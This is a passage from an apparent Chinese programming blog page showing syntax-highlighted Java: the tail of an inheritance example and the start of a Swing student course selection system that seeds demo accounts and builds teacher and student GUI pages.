class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Jc2中的methodB（）&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodC</span><span class="params">()</span> &#123;</span><br><span class="line">        methodB();<span class="comment">// 访问子类自己的methodB（）</span></span><br><span class="line">        methodA();<span class="comment">// 访问子类继承的methodA（）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jc2</span> <span class="variable">jc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jc2</span>();</span><br><span class="line">        jc2.methodC();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="学生选课系统"><a href="#学生选课系统" class="headerlink" title="学生选课系统"></a>学生选课系统</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.CardLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.Component;</span><br><span class="line"><span class="keyword">import</span> java.awt.FlowLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.GridLayout; </span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.MenuEvent;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.MenuListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseSelectionSystem</span>&#123;</span><br><span class="line">    Database db;</span><br><span class="line">    LoginFrame login_frame;</span><br><span class="line">    MainFrame manager_frame;</span><br><span class="line">    Teach teach;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CourseSelectionSystem</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        db = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&quot;course.txt&quot;</span>,<span class="string">&quot;score.txt&quot;</span>,<span class="string">&quot;account.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        db.addAccount(<span class="string">&quot;teach&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">0</span>, <span class="string">&quot;教务员  &quot;</span>);  <span class="comment">//增加新账号</span></span><br><span class="line">        db.addAccount(<span class="string">&quot;lil&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;李立  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;yangf&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;杨帆  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;zhangdw&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;张大伟  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;wangqs&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;王青松  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;chenl&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;陈丽  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;wus&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;吴松  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;liuq&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;刘强  &quot;</span>);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        teach = <span class="keyword">new</span> <span class="title class_">Teach</span>(db);</span><br><span class="line">        login_frame = <span class="keyword">new</span> <span class="title class_">LoginFrame</span>(db, teach);</span><br><span class="line">        manager_frame = <span class="keyword">new</span> <span class="title class_">MainFrame</span>(db);</span><br><span class="line">        login_frame.initFrame(manager_frame);</span><br><span class="line">        manager_frame.initFrame(login_frame);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> LoginFrame <span class="title function_">getLogin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> login_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">CourseSelectionSystem</span> <span class="variable">css</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">CourseSelectionSystem</span>();</span><br><span class="line">        css.getLogin().setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    Database db;</span><br><span class="line">    LoginFrame login_frame;</span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">manager_new_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;添加课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">student_select_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;选择课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">student_delect_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;删除课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_view_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;查看选课情况&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_info_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;查看课程信息&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;打分&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;选择课程:&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">manager_jt_course_name</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">manager_jt_course_info</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">teacher_jt_score</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程名字\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程教师\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程信息\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JComboBox</span> <span class="variable">manager_jc_teacher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JComboBox</span> <span class="variable">teacher_jc_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">student_select_course_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">student_select_course_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(student_select_course_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">student_select_course_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(student_select_course_jl);</span><br><span class="line"></span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">student_delect_course_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">student_delect_course_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(student_delect_course_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">student_delect_course_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(student_delect_course_jl);</span><br><span class="line">    </span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">teacher_score_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">teacher_score_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(teacher_score_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">teacher_score_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(teacher_score_jl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">menu_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">menu_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">content_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">content_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">manager_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">manager_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">manager_menu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;添加课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_new_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">teacher_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">teacher_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">teacher_menu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;教学任务管理&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_north</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_north_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_south</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">student_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">student_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_select_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;选课&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_delect_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;退选&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_view_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;View Course&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_select_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_delect_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_view_score_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainFrame</span><span class="params">(Database db)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;选课系统&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">              <span class="meta">@Override</span></span><br><span class="line">              <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span></span><br><span class="line">              &#123;</span><br><span class="line">                 <span class="keyword">try</span> &#123;</span><br><span class="line">                    db.updataAll();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line"></span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                setVisible(<span class="literal">false</span>);</span><br><span class="line">                login_frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">                clear();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">        </span><br><span class="line">        setLocation(<span class="number">800</span>,<span class="number">400</span>);   </span><br><span class="line"></span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        menu_cards.setLayout(menu_c_layout);</span><br><span class="line">        content_cards.setLayout(content_c_layout);</span><br><span class="line">        add(<span class="string">&quot;North&quot;</span>,menu_cards);</span><br><span class="line">        add(<span class="string">&quot;Center&quot;</span>,content_cards);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        initManagerPage();</span><br><span class="line">        initTeacherPage();</span><br><span class="line">        initStudentPage();</span><br><span class="line">        </span><br><span class="line">        pack();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initTeacherPage</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_score_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">ScoreCellRenderer</span>());</span><br><span class="line">        teacher_jc_course.setRenderer(<span class="keyword">new</span> <span class="title class_">CourseTeaCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        teacher_menuBar.add(teacher_menu);</span><br><span class="line">        teacher_menu.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                teacher_c_layout.show(teacher_cards, <span class="string">&quot;teacher_score_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;teacher_menuBar&quot;</span>,teacher_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_init_page</span></span><br><span class="line">        teacher_init_page.add(teacher_jl_init);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//manager_cards manager_new_course_page</span></span><br><span class="line">        teacher_score_page.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        teacher_view_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                reloadScoreTea(t, (<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        teacher_info_course.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, <span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>+<span class="string">&quot;课程编号: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">1</span>)</span><br><span class="line">                        +<span class="string">&quot;&lt;br&gt;&quot;</span>+<span class="string">&quot;课程名称: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">0</span>)</span><br><span class="line">                        +<span class="string">&quot;&lt;br&gt;&quot;</span>+<span class="string">&quot;课程信息: &quot;</span>+t.getCourseInfo((<span class="type">int</span>)teacher_jc_course.getSelectedItem()).get(<span class="number">2</span>)+<span class="string">&quot;&lt;body&gt;&lt;/html&gt;&quot;</span>);<span class="comment">//t.getCourseInfo((int)teacher_jc_course.getSelectedItem()).toString()</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        teacher_score.addActionListener(<span class="keyword">new</span> <span class="title class_">ActionListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">                <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> (Teacher) user;</span><br><span class="line">                t.scoreStuCourse((<span class="type">int</span>)((List)teacher_score_jl.getSelectedValue()).get(<span class="number">0</span>), (<span class="type">int</span>)((List)teacher_score_jl.getSelectedValue()).get(<span class="number">1</span>), Integer.parseInt(teacher_jt_score.getText()));</span><br><span class="line">                reloadScoreTea(t, (<span class="type">int</span>)teacher_jc_course.getSelectedItem());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        teacher_score_north.setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">                </span><br><span class="line">        teacher_score_north_course.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line">        teacher_score_north_course.add(teacher_jl_1);</span><br><span class="line">        teacher_score_north_course.add(teacher_jc_course);</span><br><span class="line">        teacher_score_north_course.add(teacher_view_course);</span><br><span class="line">        teacher_score_north_course.add(teacher_info_course);</span><br><span class="line">        teacher_score_south.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        teacher_score_south.add(teacher_jt_score);</span><br><span class="line">        teacher_score_south.add(teacher_score);</span><br><span class="line">        </span><br><span class="line">        teacher_score_north.add(<span class="string">&quot;North&quot;</span>,teacher_jl_0);</span><br><span class="line">        teacher_score_north.add(<span class="string">&quot;Center&quot;</span>,teacher_score_north_course);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;North&quot;</span>,teacher_score_north);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;Center&quot;</span>,teacher_score_jsp);</span><br><span class="line">        teacher_score_page.add(<span class="string">&quot;South&quot;</span>,teacher_score_south);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        teacher_cards.setLayout(teacher_c_layout);</span><br><span class="line">        teacher_cards.add(<span class="string">&quot;teacher_init_page&quot;</span>,teacher_init_page);</span><br><span class="line">        teacher_cards.add(<span class="string">&quot;teacher_score_page&quot;</span>,teacher_score_page);</span><br><span class="line"></span><br><span class="line">        content_cards.add(<span class="string">&quot;teacher_cards&quot;</span>,teacher_cards);   </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initStudentPage</span><span class="params">()</span> &#123;</span><br><span class="line">        student_select_course_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">CourseSelCellRenderer</span>());</span><br><span class="line">        student_delect_course_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">CourseDelCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards student_menuBar</span></span><br><span class="line">        student_menuBar.add(student_menu_select_course);</span><br><span class="line">        student_menuBar.add(student_menu_delect_course);</span><br><span class="line">        student_menu_select_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                reloadCourseStuNotSelectedList((Student) user);</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_select_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        student_menu_delect_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                reloadScoreStuList((Student) user);</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_delect_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        student_menu_view_course.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                student_c_layout.show(student_cards, <span class="string">&quot;student_view_course_page&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuDeselected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuCanceled</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        menu_cards.add(<span class="string">&quot;student_menuBar&quot;</span>,student_menuBar);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//student_cards 